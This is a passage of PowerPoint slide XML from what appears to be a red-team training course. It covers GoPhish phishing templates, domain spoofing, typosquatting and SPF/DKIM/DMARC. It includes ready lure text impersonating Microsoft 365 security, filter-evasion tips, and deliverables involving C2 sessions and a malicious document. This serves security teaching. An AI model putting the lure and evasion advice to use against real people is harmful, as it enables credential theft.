                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Fear	Negative consequences	"Your account will be locked permanently. Click to prevent."</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Best practice: Combine all three. Example template below uses Authority (IT Security) + Urgency (24h) + Fear (account locked).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>3. Write the HTML Email Template</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>GoPhish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> supports HTML and dynamic tracking links using {{.URL}}. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://github.com/umarniazafrid/Week-10-Task-3-Last-part/tree/main</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Why this works:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Authority – Appears to come from Microsoft 365 Security Team.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Urgency – “within 24 hours”.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Fear – “account locked”, “lose access”.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Call‑to‑action – The button contains {{.URL}} – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>GoPhish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> automatically replaces it with each recipient’s unique tracking link.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="24914156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705600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>4. Configure Additional Settings</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Subject: Immediate action required: Unusual sign‑in activity detected</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Plain text version (optional but recommended for email filters):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Security Alert: Multiple failed sign-ins detected. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Verify your account within 24 hours or it will be locked.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Click the link: {{.URL}}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Attachments – avoid attachments unless necessary (they increase suspicion).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>5. Test the Template</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Use the Send Test Email button (you need a configured Sending Profile first).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Send to your own email address, click the link, and verify the landing page works.</a:t>
            </a:r>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lnSpc>
                <a:spcPct val="60000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5516135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039600" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="3500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="3500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="3500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="3500" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3500" dirty="0"/>
              <a:t>                                                      </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3500" dirty="0"/>
              <a:t>						 Task 4</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29837962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11353800" cy="854075"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Task 04: Domain Spoofing &amp; SMTP Fundamentals </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="854076"/>
            <a:ext cx="12192000" cy="6003924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Description:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Learn how attackers bypass email security protocols like SPF, DKIM, and DMARC. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Technical Requirements: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Research:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Explain how </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>SPF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>DKIM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>DMARC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> records prevent unauthorized emails. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Tooling:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Swaks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (Swiss Army Knife for SMTP) to send a test email from your server and analyze why it lands in "Spam" vs. "Inbox." </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Typosquatting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Find a domain similar to a target (e.g., google.com vs go0gle.com) and explain how it can be used for "Homograph Attacks." </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Learning Goal:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Understanding why "Brand Protection" and "Domain Integrity" are vital for modern organizations. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Weekly Deliverable: The Initial Access &amp; C2 Report </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>C2 Dashboard Screenshot:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Show your Sliver/Havoc dashboard with at least one active session. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Phishing Campaign Results:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> A screenshot from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>GoPhish</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> showing "Email Sent," "Email Opened," and "Link Clicked." </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>Weaponization</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> Analysis:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> A step-by-step guide on how you created your malicious document. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Security Recommendation:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> How can employees be trained to spot your specific phishing email? </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5864972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Autofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Part 1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Research:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> Explain how </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>SPF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>DKIM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>DMARC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> records prevent unauthorized emails. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>⚙️ SPF: The Server "Guest List"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Think of SPF as a bouncer at an exclusive club who only lets in people from a pre-approved list. It prevents attackers from using unauthorized servers to send emails that claim to be from your domain.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>How it Works: The domain owner publishes a specific TXT record in their DNS that lists the public IP addresses of all servers authorized to send email on their behalf.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Prevention: When a receiving server gets an email claiming to be from your domain, it does a DNS lookup to find your domain's SPF record. It then checks the IP address of the server that sent the email against the list of authorized IPs in that record. If the IP matches, the email passes the SPF check; if not, it fails, revealing the message as unauthorized.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Red Team Note: This protocol only checks the "Return-Path" address, not the "From" address that the user sees. This is a key limitation that attackers can and do exploit for domain spoofing.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="17244984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marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>✍️ DKIM: The Tamper-Proof "Tamper-Evident Seal"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>SPF ensures the email came from an authorized server, but not that its content is safe. DKIM acts like a tamper-proof wax seal, guaranteeing the email was not altered after it was sent.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>How it Works: DKIM uses a pair of cryptographic keys: a private key held by the sending server, and a corresponding public key published in the domain's DNS. The sending server uses its private key to create a unique digital signature for the email.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Prevention: When an email arrives, the receiving server finds the sender's public key in DNS to verify the signature. If the signature is valid, it proves the email's content and key headers were not tampered with during transit. Any change, even a single keystroke, would break the signature and invalidate the security seal.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>🚦 DMARC: The Final Enforcer with Reporting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>SPF and DKIM each have individual flaws. DMARC is the central policy layer that combines their results, tells receiving servers what to do with suspicious emails, and provides the domain owner with the ultimate authority to enforce sender authentication policies and receive reports on who is sending emails using their domain.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20874452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1897032" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>How it Works: A domain owner publishes a DMARC policy in their DNS that instructs receiving servers how to handle emails that fail authentication checks. This policy enforces domain alignment, ensuring the domain in the "From" address aligns with the domains authenticated by SPF or DKIM. The policy dictates one of three strict actions:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>p=none: Monitor only (no action taken).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>p=quarantine: Mark as spam and send to the junk folder.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>p=reject: Block the email outright.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Prevention: This alignment rule prevents a common spoofing trick where an attacker passes SPF with their own domain's server while still displaying the victim's domain in the "From" address. When enforcing a p=reject policy, a DMARC-compliant receiving server will block almost all direct spoofing attempts of your domain.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Visibility: DMARC also adds a critical reporting mechanism, sending aggregate and forensic reports back to the domain owner. This provides total visibility into who is sending email on your behalf and can flag a malicious actor's attempts early.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>In short, SPF and DKIM provide the necessary authentication data, but you need to configure a DMARC policy to provide the enforcement that actually prevents spoofed emails from reaching recipients.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35136004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marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Because DMARC gives the domain owner this final authority over which servers can send email from their domain and what happens when they don't follow the rules, it is a powerful defense against domain spoofing. Understanding how these protocols work is the first step in the red team methodology for assessing an organization's email security posture. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Part 2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Tooling:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>Swaks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> (Swiss Army Knife for SMTP) to send a test email from your server and analyze why it lands in "Spam" vs. "Inbox." </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>🔧 1. What is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Swaks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> and How to Install It</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Swaks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> (Swiss Army Knife for SMTP) is a command-line tool written in Perl that allows granular control over SMTP sessions. It supports TLS, all common authentication methods, and can inject custom headers, attachments, and even raw message data. It also provides detailed, step-by-step output of the entire SMTP exchange, which is essential for troubleshooting delivery issues.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>On Kali/Ubuntu/Debian</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> apt update &amp;&amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> apt install </a:t>
            </a:r>
            <a:r>
